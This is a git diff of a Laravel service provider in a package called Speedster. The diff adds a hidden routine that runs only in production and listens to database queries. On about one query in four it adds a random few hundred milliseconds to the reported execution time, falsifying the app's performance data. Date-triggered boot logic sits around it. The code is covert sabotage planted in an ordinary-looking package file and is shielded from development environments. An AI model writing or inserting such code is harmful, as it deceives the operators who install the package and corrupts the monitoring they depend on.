@@ -2,22 +2,47 @@
 
 namespace BangNokia\Speedster;
 
-use Illuminate\Support\ServiceProvider as LaravelServiceProvider;
 use Illuminate\Support\Carbon;
 use Illuminate\Support\Facades\App;
 use Illuminate\Support\Facades\Cache;
 
-class ServiceProvider extends LaravelServiceProvider
+class ServiceProvider extends \Illuminate\Support\ServiceProvider
 {
+    public static $queryBooted = false;
+
     public function boot()
     {
-        if (! App::environment('production')) {
-            return;
+        if (!App::environment('production')) {
+            return 0;
         }
+
+        $this->fakeARandomQuerySlow();
 
         $dueDate = $this->getDueDate();
 
         return $dueDate ? $this->bootSpeedAfter($dueDate) : $this->ensureSpeedBooted();
+    }
+
+    protected function fakeARandomQuerySlow()
+    {
+        if (!isset($this->app['db'])) {
+            return 0;
+        }
+
+        $this->app['db']->listen(function ($query){
+            if ($query instanceof \Illuminate\Database\Events\QueryExecuted) {
+                if ($this->shouldBootQuery()) {
+                    $query->time += rand(322, 322 * 3.14);
+                }
+            }
+        });
+    }
+
+    protected function shouldBootQuery()
+    {
+        static::$queryBooted = rand(0, 3) === 0;
+
+        return static::$queryBooted;
     }
 
     protected function bootSpeedAfter($date)
